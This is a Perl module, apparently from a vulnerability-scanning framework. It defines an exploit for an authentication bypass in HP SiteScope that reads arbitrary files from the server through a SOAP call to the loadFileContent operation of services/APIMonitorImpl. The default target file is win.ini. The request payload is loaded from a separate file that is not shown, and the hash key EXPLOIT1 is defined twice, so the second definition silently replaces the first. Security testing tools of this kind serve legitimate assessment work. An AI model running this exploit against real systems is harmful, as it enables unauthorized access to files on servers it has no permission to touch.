package HP::MSF::HpSitescopeLoadfilecontentFileaccess;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HpSitescopeLoadfilecontentFileaccess";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits an authentication bypass vulnerability in HP SiteScope to

        retrieve an arbitrary text file from the remote server. It is accomplished by

        calling the loadFileContent operation available through the APIMonitorImpl AXIS

        service. This module has been successfully tested on HP SiteScope 11.20 over

        Windows 2003 SP2 and Linux Centos 6.3.

      ",
  METHOD => "POST",
  MSF_MODULE => "hp_sitescope_loadfilecontent_fileaccess",
  OSVDB => 85118,
  PATHS => ["SiteScope/"],
  TITLE => "HP SiteScope SOAP Call loadFileContent Remote File Access",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to SiteScope", VALUE => "/SiteScope/" },
    'RFILE' =>       { DESCRIPTION => "Remote File", VALUE => "c:\\\\windows\\\\win.ini" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'services/APIMonitorImpl',
      PAYLOAD      => read_file('MSFExploits/HP/MSF/src/HpSitescopeLoadfilecontentFileaccess.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /services/APIMonitorImpl',
      HEADERS      => {
        'SOAPAction' => '""',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
